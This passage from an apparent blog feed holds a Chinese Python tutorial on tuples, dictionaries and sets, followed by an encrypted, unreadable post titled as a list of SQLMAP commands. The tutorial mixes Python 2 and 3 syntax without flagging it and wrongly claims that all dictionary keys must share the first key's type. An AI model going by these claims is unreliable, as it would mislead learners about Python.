<td align="left">list.insert(index, obj)<br>将对象插入列表</td>
</tr>
<tr>
<td align="center">6</td>
<td align="left">list.pop([index&#x3D;-1])<br>移除列表中的一个元素（默认最后一个元素），并且返回该元素的值</td>
</tr>
<tr>
<td align="center">7</td>
<td align="left">list.remove(obj)<br>移除列表中某个值的第一个匹配项</td>
</tr>
<tr>
<td align="center">8</td>
<td align="left">list.reverse()<br>反向列表中元素</td>
</tr>
<tr>
<td align="center">9</td>
<td align="left">list.sort(cmp&#x3D;None, key&#x3D;None, reverse&#x3D;False)<br>对原列表进行排序</td>
</tr>
</tbody></table>
<br>

<br>

<h3 id="五-元组"><a href="#五-元组" class="headerlink" title="五. 元组"></a><font color="#FF6347" face="Comic sans MS">五. 元组</font></h3><blockquote>
<p><font color="#00B2EE" face="Comic sans MS"><strong>什么是元组tuple：</strong></font></p>
</blockquote>
<ol>
<li>Python的元组与列表类似，不同之处在于元组的元素不能修改。</li>
<li>元组使用小括号<code>()</code>，列表使用方括号<code>[]</code>。</li>
<li>元组创建很简单，只需要在括号中添加元素，并使用逗号隔开即可。</li>
<li>当括号中只有一个数字没有逗号时，既表示一个数字也可以便是一个元组，又可以表示数学公式中的小括号，这就产生了歧义。这种情况下，按小括号进行计算，计算结果自然是1。所以，只有1个元素的tuple定义时<font color="#FF7F00"><strong>必须加一个逗号</strong></font>。</li>
</ol>
<br>

<p><font color="#00B2EE" face="Comic sans MS"><strong>一、定义元组</strong></font></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">tup1 = (<span class="string">&#x27;physics&#x27;</span>, <span class="string">&#x27;chemistry&#x27;</span>, <span class="number">1997</span>, <span class="number">2000</span>)</span><br><span class="line">tup2 = (<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span> )</span><br><span class="line">tup3 = <span class="string">&quot;a&quot;</span>, <span class="string">&quot;b&quot;</span>, <span class="string">&quot;c&quot;</span>, <span class="string">&quot;d&quot;</span></span><br></pre></td></tr></table></figure>

<br>

<p>创建空元组：<code>tup1 = ()</code></p>
<p>元组中只包含一个元素时，需要在元素后面添加逗号。<code>tup1 = (50,)</code></p>
<p>元组与字符串类似，下标索引从0开始，可以进行截取，组合等。</p>
<br>

<p><font color="#00B2EE" face="Comic sans MS"><strong>二、使用元组</strong></font></p>
<ol>
<li>元组可以使用下标索引来访问元组中的值，如下：</li>
</ol>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"> </span><br><span class="line">tup1 = (<span class="string">&#x27;physics&#x27;</span>, <span class="string">&#x27;chemistry&#x27;</span>, <span class="number">1997</span>, <span class="number">2000</span>)</span><br><span class="line">tup2 = (<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span> )</span><br><span class="line"> </span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;tup1[0]: &quot;</span>, tup1[<span class="number">0</span>]</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;tup2[1:5]: &quot;</span>, tup2[<span class="number">1</span>:<span class="number">5</span>]</span><br><span class="line"></span><br><span class="line">以上实例输出结果：</span><br><span class="line"></span><br><span class="line">tup1[<span class="number">0</span>]:  physics</span><br><span class="line">tup2[<span class="number">1</span>:<span class="number">5</span>]:  (<span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>)</span><br></pre></td></tr></table></figure>

<ol start="2">
<li><p>元组的值不允许修改，但是可以进行运算，比如连接用加号（+），重复用星号（*）。</p>
</li>
<li><p>元组中的元素值是不允许删除的，但我们可以使用del语句来删除整个元组</p>
</li>
</ol>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"> </span><br><span class="line">tup = (<span class="string">&#x27;physics&#x27;</span>, <span class="string">&#x27;chemistry&#x27;</span>, <span class="number">1997</span>, <span class="number">2000</span>)</span><br><span class="line"> </span><br><span class="line"><span class="built_in">print</span> tup</span><br><span class="line"><span class="keyword">del</span> tup</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;After deleting tup : &quot;</span></span><br><span class="line"><span class="built_in">print</span> tup</span><br></pre></td></tr></table></figure>

<p>以上实例元组被删除后，输出变量会有异常信息，输出如下所示：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">(<span class="string">&#x27;physics&#x27;</span>, <span class="string">&#x27;chemistry&#x27;</span>, <span class="number">1997</span>, <span class="number">2000</span>)</span><br><span class="line">After deleting tup :</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File <span class="string">&quot;test.py&quot;</span>, line <span class="number">9</span>, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">    <span class="built_in">print</span> tup</span><br><span class="line">NameError: name <span class="string">&#x27;tup&#x27;</span> <span class="keyword">is</span> <span class="keyword">not</span> defined</span><br></pre></td></tr></table></figure>

<br>

<ol start="4">
<li><font color="#FF7F00"><strong>最后来看一个“可变的”tuple：</strong></font></li>
</ol>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">t = (<span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;b&#x27;</span>, [<span class="string">&#x27;A&#x27;</span>, <span class="string">&#x27;B&#x27;</span>])</span><br><span class="line">t[<span class="number">2</span>][<span class="number">0</span>] = <span class="string">&#x27;X&#x27;</span></span><br><span class="line">t[<span class="number">2</span>][<span class="number">1</span>] = <span class="string">&#x27;Y&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(t)</span><br><span class="line"></span><br><span class="line">运行结果：</span><br><span class="line">(<span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;b&#x27;</span>, [<span class="string">&#x27;X&#x27;</span>, <span class="string">&#x27;Y&#x27;</span>]) </span><br></pre></td></tr></table></figure>

<p>这个tuple定义的时候有3个元素，分别是’a’，’b’和一个list。不是说tuple一旦定义后就不可变了吗？怎么后来又变了？<br>别急，我们先看看定义的时候tuple包含的3个元素：</p>
<p><img data-src="https://i.loli.net/2019/02/28/5c77b1cc56635.png" alt="0.png"></p>
<p>当我们把list的元素’A’和’B’修改为’X’和’Y’后，tuple变为：</p>
<p><img data-src="https://i.loli.net/2019/02/28/5c77b1f4c3628.png" alt="0 (1).png"></p>
<br>

<p>表面上看，tuple的元素确实变了，但其实变的不是tuple的元素，而是list的元素。tuple一开始指向的list并没有改成别的list，所以，tuple所谓的“不变”是说，tuple的每个元素，指向永远不变。即指向’a’，就不能改成指向’b’，指向一个list，就不能改成指向其他对象，但指向的这个list本身是可变的！</p>
<p>理解了“指向不变”后，要创建一个内容也不变的tuple怎么做？那就必须保证tuple的每一个元素本身也不能变。</p>
<br>

<p><font color="#00B2EE" face="Comic sans MS"><strong>三、元组运算符</strong></font></p>
<p>与字符串一样，元组之间可以使用 + 号和 * 号进行运算。这就意味着他们可以组合和复制，运算后会生成一个新的元组。</p>
<table>
<thead>
<tr>
<th align="left">Python表达式</th>
<th align="left">结果</th>
<th align="left">描述</th>
</tr>
</thead>
<tbody><tr>
<td align="left">len((1, 2, 3))</td>
<td align="left">3</td>
<td align="left">计算元素个数</td>
</tr>
<tr>
<td align="left">(1, 2, 3) + (4, 5, 6)</td>
<td align="left">(1, 2, 3, 4, 5, 6)</td>
<td align="left">连接</td>
</tr>
<tr>
<td align="left">(‘Hi!’,) * 4</td>
<td align="left">(‘Hi!’, ‘Hi!’, ‘Hi!’, ‘Hi!’)</td>
<td align="left">复制</td>
</tr>
<tr>
<td align="left">3 in (1, 2, 3)</td>
<td align="left">True</td>
<td align="left">元素是否存在</td>
</tr>
<tr>
<td align="left">for x in (1, 2, 3): print x,</td>
<td align="left">1 2 3</td>
<td align="left">迭代</td>
</tr>
</tbody></table>
<br>

<p><font color="#00B2EE" face="Comic sans MS"><strong>四、元组内置函数</strong></font></p>
<p>Python元组包含了以下内置函数</p>
<table>
<thead>
<tr>
<th align="center">序号</th>
<th align="left">函数</th>
</tr>
</thead>
<tbody><tr>
<td align="center">1</td>
<td align="left">cmp(tuple1, tuple2)<br>比较两个元组元素。</td>
</tr>
<tr>
<td align="center">2</td>
<td align="left">len(tuple)<br>计算元组元素个数。</td>
</tr>
<tr>
<td align="center">3</td>
<td align="left">max(tuple)<br>返回元组中元素最大值。</td>
</tr>
<tr>
<td align="center">4</td>
<td align="left">min(tuple)<br>返回元组中元素最小值。</td>
</tr>
<tr>
<td align="center">5</td>
<td align="left">tuple(seq)<br>将列表转换为元组。</td>
</tr>
</tbody></table>
<br>

<br>

<h3 id="六-字典"><a href="#六-字典" class="headerlink" title="六. 字典"></a><font color="#FF6347" face="Comic sans MS">六. 字典</font></h3><h4 id="6-1-字典的定义"><a href="#6-1-字典的定义" class="headerlink" title="6.1 字典的定义"></a><font color="#3CB371" face="Comic sans MS">6.1 字典的定义</font></h4><blockquote>
<p><font color="#00B2EE" face="Comic sans MS"><strong>关于字典dict：</strong></font></p>
</blockquote>
<ol>
<li>字典是另一种可变容器模型，且可存储任意类型对象；</li>
<li>字典的每个键值 key&#x3D;&gt;value 对用冒号 : 分割，每个键值对之间用逗号 , 分割，整个字典包括在花括号 {} 中；<code>d = &#123;key1 : value1, key2 : value2 &#125;</code></li>
<li>键一般是唯一的，如果重复最后的一个键值对会替换前面的，值不需要唯一；</li>
<li>值可以取任何数据类型，但键必须是不可变的，如字符串，数字或元组；</li>
<li>第一个键定义为什么数据类型，后面所有的键必须定义为相同的数据类型；</li>
<li>访问字典里的值，把相应的键放入熟悉的方括弧即可，<code>dict[key]</code></li>
</ol>
<br>

<h4 id="6-2-字典的修改"><a href="#6-2-字典的修改" class="headerlink" title="6.2 字典的修改"></a><font color="#3CB371" face="Comic sans MS">6.2 字典的修改</font></h4><p>向字典添加新内容的方法是增加新的键&#x2F;值对，修改或删除已有键&#x2F;值对</p>
<p><font color="#00B2EE" face="Comic sans MS"><strong>一、添加键—值对、修改字典</strong></font><br><br></p>
<p><font color="#FF7F00"><strong>字典是一种动态结构，可随时在其中添加键—值对</strong></font>。要添加键—值对，可依次指定字典名、用方括号括起的键和相关联的值。</p>
<p>如下示例，我们先建立一个空字典，然后向里面添加元素（键值对）并修改：<br><font color="#FF7F00"></font></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a=&#123;&#125;</span><br><span class="line">a[<span class="string">&#x27;color&#x27;</span>]=<span class="string">&#x27;green&#x27;</span></span><br><span class="line">a[<span class="string">&#x27;points&#x27;</span>]=<span class="number">5</span></span><br><span class="line"><span class="built_in">print</span>(a[<span class="string">&#x27;color&#x27;</span>],a[<span class="string">&#x27;points&#x27;</span>])</span><br><span class="line"></span><br><span class="line">a[<span class="string">&#x27;color&#x27;</span>]=<span class="number">666</span></span><br><span class="line"><span class="built_in">print</span>(a[<span class="string">&#x27;color&#x27;</span>],a[<span class="string">&#x27;points&#x27;</span>])</span><br><span class="line"></span><br><span class="line">运行结果：</span><br><span class="line">green <span class="number">5</span></span><br><span class="line"><span class="number">666</span> <span class="number">5</span></span><br></pre></td></tr></table></figure>


<br>

<p><font color="#00B2EE" face="Comic sans MS"><strong>二、删除键—值对</strong></font></p>
<p>能删单一的元素也能清空字典，清空只需一项操作。</p>
<blockquote>
<p><font color="#FF7F00"><strong>删除字典可以使用del或者pop()。</strong></font></p>
</blockquote>
<ol>
<li><font color="#FF7F00"><strong>要删除一个key:</strong></font><ol>
<li>用pop(key)方法，对应的value也会从dict中删除</li>
<li>可使用del 语句将相应的键—值对彻底删除。使用del 语句时，必须指定字典名和要删除的键。<code>del dict[&#39;key&#39;]</code></li>
</ol>
</li>
<li><font color="#FF7F00"><strong>删除整个字典：</strong></font>del dict 则dict这个字典被删除了</li>
</ol>
<br>


<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding: UTF-8 -*-</span></span><br><span class="line"> </span><br><span class="line"><span class="built_in">dict</span> = &#123;<span class="string">&#x27;Name&#x27;</span>: <span class="string">&#x27;Zara&#x27;</span>, <span class="string">&#x27;Age&#x27;</span>: <span class="number">7</span>, <span class="string">&#x27;Class&#x27;</span>: <span class="string">&#x27;First&#x27;</span>&#125;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">del</span> <span class="built_in">dict</span>[<span class="string">&#x27;Name&#x27;</span>]  <span class="comment"># 删除键是&#x27;Name&#x27;的条目</span></span><br><span class="line"><span class="built_in">dict</span>.pop(<span class="string">&#x27;Class&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">dict</span>[<span class="string">&#x27;Age&#x27;</span>])</span><br><span class="line"><span class="built_in">dict</span>.clear()      <span class="comment"># 清空词典所有条目</span></span><br><span class="line"><span class="keyword">del</span> <span class="built_in">dict</span>          <span class="comment"># 删除词典</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">dict</span>[<span class="string">&#x27;Age&#x27;</span>])</span><br><span class="line"></span><br><span class="line">运行结果：</span><br><span class="line"><span class="number">7</span></span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File <span class="string">&quot;1.py&quot;</span>, line <span class="number">11</span>, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">dict</span>[<span class="string">&#x27;Age&#x27;</span>])</span><br><span class="line">TypeError: <span class="string">&#x27;type&#x27;</span> <span class="built_in">object</span> <span class="keyword">is</span> <span class="keyword">not</span> subscriptable</span><br></pre></td></tr></table></figure>


<br>

<h4 id="6-3-字典的遍历"><a href="#6-3-字典的遍历" class="headerlink" title="6.3 字典的遍历"></a><font color="#3CB371" face="Comic sans MS">6.3 字典的遍历</font></h4><p><font color="#00B2EE" face="Comic sans MS"><strong>一、判断字典中</strong><font color="red"><strong>某个键</strong></font><strong>是否存在</strong></font></p>
<blockquote>
<p><font color="#FF7F00"><strong>方法：</strong></font></p>
</blockquote>
<ol>
<li>通过in判断key是否存在；</li>
<li>通过dict提供的get()方法，如果key不存在，可以返回None，或者返回自己指定的value。</li>
</ol>
<br>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding: UTF-8 -*-</span></span><br><span class="line"> </span><br><span class="line"><span class="built_in">dict</span> = &#123;<span class="string">&#x27;Name&#x27;</span>: <span class="string">&#x27;Zara&#x27;</span>, <span class="string">&#x27;Age&#x27;</span>: <span class="number">7</span>, <span class="string">&#x27;Class&#x27;</span>: <span class="string">&#x27;First&#x27;</span>&#125;</span><br><span class="line">a = <span class="string">&#x27;Name&#x27;</span> <span class="keyword">in</span> <span class="built_in">dict</span></span><br><span class="line">b = <span class="string">&#x27;Year&#x27;</span> <span class="keyword">in</span> <span class="built_in">dict</span></span><br><span class="line"><span class="built_in">print</span>(a)</span><br><span class="line"><span class="built_in">print</span>(b)</span><br><span class="line"></span><br><span class="line">c = <span class="built_in">dict</span>.get(<span class="string">&#x27;Name&#x27;</span>,<span class="string">&#x27;如果不存在，这里是返回信息&#x27;</span>)</span><br><span class="line">d = <span class="built_in">dict</span>.get(<span class="string">&#x27;Year&#x27;</span>,<span class="string">&#x27;如果不存在，这里是返回信息&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(c)</span><br><span class="line"><span class="built_in">print</span>(d)</span><br><span class="line"></span><br><span class="line">运行结果：</span><br><span class="line"><span class="literal">True</span></span><br><span class="line"><span class="literal">False</span></span><br><span class="line">Zara</span><br><span class="line">如果不存在，这里是返回信息</span><br></pre></td></tr></table></figure>

<br>

<p><font color="#00B2EE" face="Comic sans MS"><strong>二、遍历字典中的所有键</strong></font></p>
<p>在不需要使用字典中的值时，方法keys() 很有用。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">f = &#123;</span><br><span class="line">      <span class="string">&#x27;jen&#x27;</span>: <span class="string">&#x27;python&#x27;</span>,</span><br><span class="line">      <span class="string">&#x27;sarah&#x27;</span>: <span class="string">&#x27;c&#x27;</span>,</span><br><span class="line">      <span class="string">&#x27;edward&#x27;</span>: <span class="string">&#x27;ruby&#x27;</span>,</span><br><span class="line">      <span class="string">&#x27;phil&#x27;</span>: <span class="string">&#x27;python&#x27;</span>,</span><br><span class="line">      &#125;  </span><br><span class="line">	  </span><br><span class="line"><span class="keyword">for</span> name <span class="keyword">in</span> f.keys():</span><br><span class="line">      <span class="built_in">print</span>(name.title())</span><br><span class="line"></span><br><span class="line">运行结果：</span><br><span class="line">Jen</span><br><span class="line">Sarah</span><br><span class="line">Edward</span><br><span class="line">Phil</span><br></pre></td></tr></table></figure>

<br>

<p><font color="#00B2EE" face="Comic sans MS"><strong>三、遍历字典中的所有值</strong></font></p>
<p>如果你感兴趣的主要是字典包含的值，可使用方法values() ，它返回一个值列表，而不包含任何键。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">f = &#123;</span><br><span class="line">    <span class="string">&#x27;jen&#x27;</span>: <span class="string">&#x27;python&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;sarah&#x27;</span>: <span class="string">&#x27;c&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;edward&#x27;</span>: <span class="string">&#x27;ruby&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;phil&#x27;</span>: <span class="string">&#x27;python&#x27;</span>,</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> g <span class="keyword">in</span> f.values():</span><br><span class="line">    <span class="built_in">print</span>(g.title())</span><br><span class="line"></span><br><span class="line">运行结果：</span><br><span class="line">Python</span><br><span class="line">C</span><br><span class="line">Ruby</span><br><span class="line">Python</span><br></pre></td></tr></table></figure>

<br>

<h4 id="6-4-字典的各种嵌套"><a href="#6-4-字典的各种嵌套" class="headerlink" title="6.4 字典的各种嵌套"></a><font color="#3CB371" face="Comic sans MS">6.4 字典的各种嵌套</font></h4><p>请自行查阅Python编程：从入门到实践 6.4</p>
<br>

<h4 id="6-5-字典内置函数-amp-方法"><a href="#6-5-字典内置函数-amp-方法" class="headerlink" title="6.5 字典内置函数&amp;方法"></a><font color="#3CB371" face="Comic sans MS">6.5 字典内置函数&amp;方法</font></h4><p>可查阅：<font color="#00B2EE">[<a href="http://www.runoob.com/python/python-dictionary.html">Python字典函数&amp;方法</a>]</font></p>
<br>

<p><font color="#00B2EE" face="Comic sans MS"><strong>一、Python字典包含了以下内置函数：</strong></font></p>
<table>
<thead>
<tr>
<th align="center">序号</th>
<th align="left">函数</th>
</tr>
</thead>
<tbody><tr>
<td align="center">1</td>
<td align="left">cmp(dict1, dict2)<br>比较两个字典元素。</td>
</tr>
<tr>
<td align="center">2</td>
<td align="left">len(dict)<br>计算字典元素个数，即键的总数。</td>
</tr>
<tr>
<td align="center">3</td>
<td align="left">str(dict)<br>输出字典可打印的字符串表示。</td>
</tr>
<tr>
<td align="center">4</td>
<td align="left">type(variable)<br>返回输入的变量类型，如果变量是字典就返回字典类型。</td>
</tr>
</tbody></table>
<br>

<p><font color="#00B2EE" face="Comic sans MS"><strong>二、Python字典包含了以下内置方法：</strong></font></p>
<table>
<thead>
<tr>
<th align="center">序号</th>
<th align="left">方法</th>
</tr>
</thead>
<tbody><tr>
<td align="center">1</td>
<td align="left">dict.clear()<br>删除字典内所有元素</td>
</tr>
<tr>
<td align="center">2</td>
<td align="left">dict.copy()<br>返回一个字典的浅复制</td>
</tr>
<tr>
<td align="center">3</td>
<td align="left">dict.fromkeys(seq[, val])<br>创建一个新字典，以序列 seq 中元素做字典的键，val 为字典所有键对应的初始值</td>
</tr>
<tr>
<td align="center">4</td>
<td align="left">dict.get(key, default&#x3D;None)<br>返回指定键的值，如果值不在字典中返回default值</td>
</tr>
<tr>
<td align="center">5</td>
<td align="left">dict.has_key(key)<br>如果键在字典dict里返回true，否则返回false</td>
</tr>
<tr>
<td align="center">6</td>
<td align="left">dict.items()<br>以列表返回可遍历的(键, 值) 元组数组</td>
</tr>
<tr>
<td align="center">7</td>
<td align="left">dict.keys()<br>以列表返回一个字典所有的键</td>
</tr>
<tr>
<td align="center">8</td>
<td align="left">dict.setdefault(key, default&#x3D;None)<br>和get()类似, 但如果键不存在于字典中，将会添加键并将值设为default</td>
</tr>
<tr>
<td align="center">9</td>
<td align="left">dict.update(dict2)<br>把字典dict2的键&#x2F;值对更新到dict里</td>
</tr>
<tr>
<td align="center">10</td>
<td align="left">dict.values()<br>以列表返回字典中的所有值</td>
</tr>
<tr>
<td align="center">11</td>
<td align="left">pop(key[,default])<br>删除字典给定键 key 所对应的值，返回值为被删除的值。key值必须给出。 否则，返回default值。</td>
</tr>
<tr>
<td align="center">12</td>
<td align="left">popitem()<br>随机返回并删除字典中的一对键和值。</td>
</tr>
</tbody></table>
<br>

<br>

<h3 id="七-集合"><a href="#七-集合" class="headerlink" title="七. 集合"></a><font color="#FF6347" face="Comic sans MS">七. 集合</font></h3><blockquote>
<p><font color="#FF7F00"><strong>集合是什么：</strong></font></p>
</blockquote>
<ol>
<li>集合和字典类似，也是一组key的集合，但不存储value。由于key不能重复，所以，在集合中，没有重复的key；</li>
<li>集合可以看成数学意义上的无序和无重复元素的集合，因此，两个set可以做数学意义上的交集、并集，差等操作；</li>
<li>基本功能包括关系测试和消除重复元素。集合对象还支持 union（联合），intersection（交），difference（差）和 sysmmetric difference（对称差集）等数学运算；</li>
<li>大括号或 set() <strong>函数</strong>可以用来创建集合。注意：想要创建空集合，你必须使用 set() 而不是 {}。后者用于创建空字典。</li>
<li>注意：<font color="#FF7F00"><strong>set()只能放一个参数，它会将里面的字符串拆成字符，并且每个字符都是无序的（集合的属性）</strong></font>；</li>
<li>如果集合中包含多喝不可拆的元素，则必须用{}来定义集合。</li>
</ol>
<br>

<p>仔细分析如下代码：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">basket = &#123;</span><br><span class="line">	<span class="string">&#x27;apple&#x27;</span>, </span><br><span class="line">	<span class="string">&#x27;orange&#x27;</span>, </span><br><span class="line">	<span class="string">&#x27;apple&#x27;</span>, </span><br><span class="line">	<span class="string">&#x27;pear&#x27;</span>, </span><br><span class="line">	<span class="string">&#x27;orange&#x27;</span>, </span><br><span class="line">	<span class="string">&#x27;banana&#x27;</span>&#125;</span><br><span class="line">	</span><br><span class="line"><span class="built_in">print</span>(basket)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;\n&#x27;</span>) </span><br><span class="line"></span><br><span class="line">a = <span class="built_in">set</span>(<span class="string">&#x27;abracadabra&#x27;</span>)</span><br><span class="line">b = <span class="built_in">set</span>(<span class="string">&#x27;alacazam&#x27;</span>)</span><br><span class="line">c =<span class="built_in">set</span>(<span class="string">&#x27;我们&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(a) </span><br><span class="line"><span class="built_in">print</span>(b)</span><br><span class="line"><span class="built_in">print</span>(c)</span><br><span class="line"> </span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;\n&#x27;</span>) </span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(a - b) </span><br><span class="line"><span class="built_in">print</span>(a | b) </span><br><span class="line"><span class="built_in">print</span>(a &amp; b) </span><br><span class="line"><span class="built_in">print</span>(a ^ b ) </span><br><span class="line"></span><br><span class="line">运行结果：</span><br><span class="line">&#123;<span class="string">&#x27;pear&#x27;</span>, <span class="string">&#x27;orange&#x27;</span>, <span class="string">&#x27;banana&#x27;</span>, <span class="string">&#x27;apple&#x27;</span>&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#123;<span class="string">&#x27;c&#x27;</span>, <span class="string">&#x27;b&#x27;</span>, <span class="string">&#x27;r&#x27;</span>, <span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;d&#x27;</span>&#125;</span><br><span class="line">&#123;<span class="string">&#x27;c&#x27;</span>, <span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;m&#x27;</span>, <span class="string">&#x27;z&#x27;</span>, <span class="string">&#x27;l&#x27;</span>&#125;</span><br><span class="line">&#123;<span class="string">&#x27;们&#x27;</span>, <span class="string">&#x27;我&#x27;</span>&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#123;<span class="string">&#x27;r&#x27;</span>, <span class="string">&#x27;d&#x27;</span>, <span class="string">&#x27;b&#x27;</span>&#125;</span><br><span class="line">&#123;<span class="string">&#x27;c&#x27;</span>, <span class="string">&#x27;b&#x27;</span>, <span class="string">&#x27;r&#x27;</span>, <span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;m&#x27;</span>, <span class="string">&#x27;d&#x27;</span>, <span class="string">&#x27;z&#x27;</span>, <span class="string">&#x27;l&#x27;</span>&#125;</span><br><span class="line">&#123;<span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;c&#x27;</span>&#125;</span><br><span class="line">&#123;<span class="string">&#x27;m&#x27;</span>, <span class="string">&#x27;b&#x27;</span>, <span class="string">&#x27;d&#x27;</span>, <span class="string">&#x27;z&#x27;</span>, <span class="string">&#x27;l&#x27;</span>, <span class="string">&#x27;r&#x27;</span>&#125;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>Python</category>
      </categories>
      <tags>
        <tag>Python语言</tag>
      </tags>
  </entry>
  <entry>
    <title>SQLMAP命令大全</title>
    <url>/post/SQLMAP-shell/</url>
    <content><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
  <script id="hbeData" type="hbeData" data-hmacdigest="a8b138038777359dfc2a400b77a87c693dfe78aa70144146d7c822c9b545eca3">f2cb6dad3997b265c98f36a97452129cf0dfaa3c542773cbc03c8f8b57644f790e7fa31d9248e5aa4cbb4ef8610a9bce16a079e414bcda6ce09c335551bf05268603c5fb9fa84c7e0f3b7092231e8dbd83097c961f65e80e48d70200d257cb3f1c0cbd77b3be44681ee01dc3149b08e845e939ef0c04af25fd879030456350d60a584cf2e1b88328592a0a75952311bee3f407e3ffd61f04814eb5dadea0a74454707f7c51d797e291d871d2c51561f5b164ee2e53697b5c500c2bcfe7bd2ccc059a64f2695b51c07a97e36392573a2a3609dcdc9bb5b325b5f038326e664e8361de220a7ab63afa959ef687b2bedd884aa9a95deaefa8a8f6f7e74c6c8a3b4add431793aaef6a69665cf4029f3d4cb7476ea24cecf77595077304b03a3e7e48dc099277d26343657bf3cd5aec68462e9bb298fa44caf9bef9456e15c6d9b74a835c5b05f3f59897ba171c705bb44f8e30bfba24a5529ef312f63aeb393b62a04e7dfad91ab407df2ca5be1dcb474c8b6e1b13e63acf298f9e8144dd16cb0b21b88770a62c7436567fd4a9e38eb4ce7874893808550e4c7c4389addedc6b6fa36913caa1a08df45bd5d5e919521bc214df861fabab6aeb75084501407ea1755410972c3d91c6dc7eb6db0ab02fb53086ede2b83775f753fe58c4c69e52968d50ee2fa9e6250a87e736cd1926871711d1fea0c04e74ac4f3c9ddb6c4d67bf39a707179145eeb16f3b5574004282d4bd0266f66a63ecd90ce9872d83c1df93b48af414f21c498d21213c721350cf3f9a7af9ca6150606cd8c4d5fa01cb362017fa0aa0794e990220cc00435ccb584f290034d6f14c19f40a6f07a235ea2f89d2a265dbe23eb3779aaab62a429e0d4bb22f2d50020ae90a87ace70ac1c8894ab85c48a309fe55a0df59a261cd41b627806522f8105afb7ee38ad12f25ce89ff93852c23e23056ddc14bd044332e28e5d57773f228354345df1c7e13dc3c8ec7907b02b48b8ca5ca9a2b2e5ca96cc8385b13b024329f56cb83818cb139ca80d73b5e90a4318b425ce28c92d94f39406d9b5ed23a20be5e043f3586aba4b21559ac3874be9462b5b07908acda75a1442d0cb02801dd143ccf6ca1343bbc43caec3c0ef611c3470b117860ff85e44013c897992eb25c4c80aa808aa5e4c8fbca684ae181be958b598b2c32844c5b7c5cb7772c9bd998fd195164a2bf347ee8cf01b7bccac2d5bab5ef7e1bffbe947b0d41828d29482027d677413e001a3035b30c9eac0bd63f2000dd44e3371208ecd168ea4435bd45ac86351827795cbf2c5e6c35596ee6d19d7b4951685535fd8d144fba648472dbbc3e98586366a268f0c3ebba16ea63bdbfb518667898eaf2d4ffe7a49bcd43bfc0122bdbffa9d62f35e41a3a5163e24fa9d88eccb949b281624989db8e764eae5ab69e222aaa4a0115701d204828d02259aac74b6144736c57d5f7c560b909c31532708c54f9a5a7038cf6b727a693bb3b8419e7d39f8b7b14ed938d0e56f9c66c4747fd65c950336ababe84630789805de9793c7d54811aa4357effd51fd2147715635f8ddae1c1dff3f686b6e5afe395abf4d229f29b235596ba7ae91645413530a3b652c43b0e2305a42526bf3a5fa459e5e38d3bd6b19bc68b5b0b59fee7a4391ec4025332bdbb824f9894be694e8688c125a3a94aeada79891ce6e4b370fc829f325a1f10ab5f5c4fc3a7272ef07aecccfc20cdc69d25e9d6e2495c8843bff5e46383de43e5acb1d077cb81e958c18696eca318b1aac73b9eafefa97c36c35823368f28a8b262952a42bdaeca6cbf4443f2440f2c340b74e857d23cedb98d8c83af710489f390e21f660bc3d9eef6ce5b37de78933b8bd6fb7e138811b0c9330c8b6649d47c0d4d00146046bfb7c9f44a9c0e5a515bcf5d5f6ef77b92b183feeaeb92e68e18dea212b0a29ac21f76f5cab02c5cc6a13b76fd2e9b96b1393aba44f6cb8ec7181ded3bf87281fc188d98726d8f63b8050e603eafe60d7fafa55c0c0a96388c680313a80337ed975910f07fe6f109f8ec09fc0b67376365f53ba1f862d4ba5badda176d0ec8ab2735b601e59380ae527460495db4238219e9e0bad54b3f300e4206fef1307f2cf183d2ccbd0d661063b4e1c206bd13c6aebc97fe6023f18a3271db6a103307cb7b930dbff0d6e8929c162a2c0f874300597d6e16cde1d3caf0